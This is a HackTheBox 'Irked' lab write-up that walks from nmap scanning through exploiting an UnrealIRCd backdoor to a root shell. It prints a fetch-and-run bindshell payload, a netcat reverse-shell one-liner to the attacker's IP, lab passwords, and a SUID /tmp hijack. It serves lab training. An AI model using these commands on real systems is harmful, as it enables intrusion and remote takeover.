@@ -1,0 +1,96 @@
+HTB-Irked-Writeup
+
+ip : 10.10.10.117
+
+Nmap
+----
+- nmap revealed 6 open ports 
+	SSH on 22
+	HTTP on 80
+	rpcbind on 111
+	6697 running ircs-u
+	8067 running infi-async
+	65534  unknown
+- nmap revelaed the name of the IRC server to be UnrealIRCd
+
+Enumeration
+-----------
+- on visiting port 80 we see a big emoji image with a reference to getting IRC working 
+- since we have the name f the server we can try searchsploit against it 
+- we get a few exploits 
+- we got a metasploit exploit and a pearl exploit, we can examine the pearl script 
+
+	searchsploit -x exploits/linux/remote/13853.pl
+
+- the script is sending "AB" followed by the payload
+
+	my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &';
+
+Shell as ircd
+--------------
+- with the information we gathered we can connect to the server with netcat and pass a payload ourselves to exploit it
+- checking this out by sending ping through netcat and listening with tcpdump
+
+	tcpdump -ni tun0 icmp
+
+	nc 10.10.10.117 6697
+	AB; ping -c 2 10.10.14.54
+
+- we can see in tcpdump that the ping was successful
+- we can now send a reverse shell instead of ping to get a shell
+
+	nc -nlvp 9001
+
+	AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.54 9001 >/tmp/f 
+
+- we got a shell as ircd 
+- we cannot read the user flag yet only the user djmardov can read user flag
+
+Shell as djmardow 
+-----------------
+- in the same directory as user.txt there is another hidden file called .backup
+- on checking .backup we got a hint that steganography might be at play here 
+- we also got a potential password from that file
+
+	creds : UPupDOWNdownLRlrBAbaSSss
+
+- while enumerating the site the only image we have seen till now was the emoji image from the root page 
+- we get the file using wget and check it against steghide
+
+	steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+
+- we got a file called pass.txt
+- viewing the file and we got a password 
+- checking it against djmardov through SSH and it worked
+
+	creds : djmardov : Kab6h+m+bbp2J:HG
+
+- grab the user flag
+
+Priv-esc
+--------
+- trying a bunch of post enumeration commands and we found nothing
+- running LinEnum.sh on the machine and we found an interesting SUID bit thats not usually seen
+	
+	/usr/bin/viewuser
+
+- checking gtfobins yield no result 
+- tried running the viewuser SUID to findout what its doing 
+- it errors out saying that /tmp/listusers is not found 
+- we can possibly exploit this by adding the /tmp/listusers with a reverse shell and getting a shell back or even by adding bash to it 
+- we can try this out by adding id command to the /tmp/listusers file and running /usr/bin/viewuser
+
+	echo id > /tmp/listusers
+	chmod +x /tmp/listusers
+	/usr/bin/viewuser
+
+- we got output for id command which proves that this method works 
+- now we can add sh or bash to the /tmp/listusers
+
+	echo sh > /tmp/listusers
+	or
+	echo bash > /tmp/listusers
+	viewuser
+
+- we got a shell as root 
+- grab the root flag 
